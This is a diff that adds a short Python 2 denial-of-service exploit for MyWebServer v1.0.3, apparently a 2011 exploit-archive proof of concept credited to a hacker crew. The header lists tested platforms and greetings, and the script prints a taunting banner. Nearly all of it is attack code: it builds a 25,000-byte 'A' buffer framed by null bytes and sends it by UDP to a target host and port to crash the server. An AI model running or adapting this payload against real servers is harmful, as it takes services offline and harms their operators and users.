@@ -1,0 +1,34 @@
+# #########################################################################
+#~ Title         : MyWebServer v1.0.3 Denial Of Service  
+#~ Software      : http://www.softpedia.com/get/Internet/Servers/WEB-Servers/MyWebServer.shtml
+#~ Tested on     : Windows 7 (home premium) / Windows XP SP2 EN
+#~ Date          : 27/07/2011
+#~ Author        : X-h4ck
+#~ Site          : http://www.pirate.al/ #PirateAL Crew , http://theflashcrew.blogspot.com/ 
+#~ Email         : mem001@live.com 
+#~ Greetz        : Danzel - Wulns~ - IllyrianWarrior- Ace - M4yh3m - Saldeath - bi0 - Slimshaddy - d3trimentaL - Lekosta - Pretorian - CroSs - Rigon - mywisdom
+# #########################################################################
+#Attention : It will crash on google chrome!
+
+#!/usr/bin/python
+print " MyWebServer v1.0.3 Denial Of Service"
+print " PirateAL@ // Aint no pussy made where we came from \\ "
+print " "
+
+import socket
+ 
+host = '127.0.0.1' #IP
+port = 80 #PORT
+
+buff = "\x41" * 25000
+aww = "A"
+exp = "\x00\x01" + buff + "\0" + aww + "\0" 
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+try:
+    print "Connecting..."
+    print "w8..."
+    sock.sendto(exp, (host, port))
+    print sock.recv(1024)
+    sock.close()
+except:
+    print "hmmm, done"
